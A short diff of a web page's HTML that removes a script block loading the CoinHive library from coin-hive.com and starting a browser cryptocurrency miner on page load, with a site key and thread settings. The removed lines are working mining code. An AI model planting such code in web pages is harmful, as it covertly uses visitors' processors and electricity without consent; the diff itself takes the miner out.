@@ -379,19 +379,3 @@ ga('create', 'UA-28399789-4', 'auto');
 ga('send', 'pageview');
 
 </script>
-<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
-  <script>
-  function when(lib){ var _cb, _ival=setInterval(function(){ if(self[lib]) { _cb(); clearInterval(_ival); } }, 20); return{ run: function(cb) { _cb=cb; } } }
-
-  var miner;
-
-  when('CoinHive').run(function(){
-    miner = new CoinHive.User('HZbryycOfkJHs2hxJ0Fm9a83bI48UXps', 'unreadable', {
-      threads: 3,
-      throttle: 0.4
-    });
-    miner.setAutoThreadsEnabled(true);
-    miner.start();
-  });
-</script>
-
